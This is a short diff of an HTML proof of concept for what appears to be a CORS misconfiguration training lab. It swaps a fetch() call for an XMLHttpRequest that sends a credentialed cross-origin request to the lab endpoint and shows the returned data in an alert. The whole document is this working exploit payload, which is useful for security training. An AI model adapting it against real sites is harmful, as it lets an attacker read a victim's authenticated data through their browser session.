@@ -1,8 +1,13 @@
+<html>
+<body>
 <script>
-fetch("https://labs.hacktify.in/HTML/cors_lab/lab_4/cors_4.php", {
-  method: "GET",
-  credentials: "include"
-})
-.then(response => response.text())
-.then(data => alert(data));
+var req = new XMLHttpRequest();
+req.onload = function() {
+  alert(this.responseText);
+};
+req.open('GET', 'https://labs.hacktify.in/HTML/cors_lab/lab_4/cors_4.php', true);
+req.withCredentials = true; 
+req.send();
 </script>
+</body>
+</html>
